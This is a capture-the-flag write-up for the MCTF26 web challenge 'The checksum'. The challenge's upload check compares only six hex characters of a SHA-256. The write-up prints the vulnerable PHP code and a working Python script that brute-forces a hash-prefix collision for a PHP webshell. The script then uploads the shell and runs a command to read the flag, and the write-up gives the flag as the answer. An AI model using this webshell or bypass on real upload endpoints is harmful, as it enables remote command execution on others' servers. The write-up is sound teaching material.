---
title: "The checksum (PHP Module Tester)"
ctf: "MCTF26"
date: 2026-11-20
category: web
difficulty: easy
points: N/A
flag_format: "MCTF26{...}"
---

# The checksum (PHP Module Tester)

## Summary

Upload validation compares only the first 6 hex characters of the uploaded file's
SHA-256 against a hardcoded value. A malicious PHP file was brute-forced until its
SHA-256 prefix matched `test.php`'s checksum (`6b0c11`), then uploaded and executed.

## Solution

### Step 1: Identify the weak validation

`allowed.php` lists approved modules and 6-character checksums. Downloading `test.php`
and hashing it shows `sha256(file)[:6] == "6b0c11"`. The server source (recovered after
code execution) confirms:

```php
$hash = hash_file("sha256", $tmpPath);
$hash = substr($hash, 0, 6);
$filename = basename($_FILES["file"]["name"]);
if (!isset($modules[$filename]) || $modules[$filename]["hash"] != $hash) {
    $message = "Invalid module.";
} else {
    move_uploaded_file($tmpPath, $path);
    ob_start(); include $path; $output = ob_get_clean();
    $message = htmlspecialchars($output);
}
```

Only 24 bits are checked, so a collision is easy to mine by appending a varying
comment to a PHP webshell.

### Step 2: Mine a colliding payload, upload it, read the flag

```python
import hashlib, re, html, requests

URL = "http://10.240.28.193/"
PREFIX = "6b0c11"
payload = b'<?php system($_GET["cmd"] ?? "id"); ?>\n<!-- nonce: '
suffix = b' -->\n'

i = 0
while True:
    data = payload + str(i).encode() + suffix
    if hashlib.sha256(data).hexdigest().startswith(PREFIX):
        break
    i += 1

r = requests.post(URL, params={"cmd": "cat /var/www/html/flag.txt"},
                  files={"file": ("test.php", data)}, timeout=30)
out = re.search(r'<div class="output-div">(.*?)</div>', r.text, re.S).group(1)
print(html.unescape(re.sub(r'<[^>]+>', '', out)).strip())
```

Output:

```
MCTF26{cH3ck5uMM3d_4Nd_phpwned}
```

## Flag

```
MCTF26{cH3ck5uMM3d_4Nd_phpwned}
```
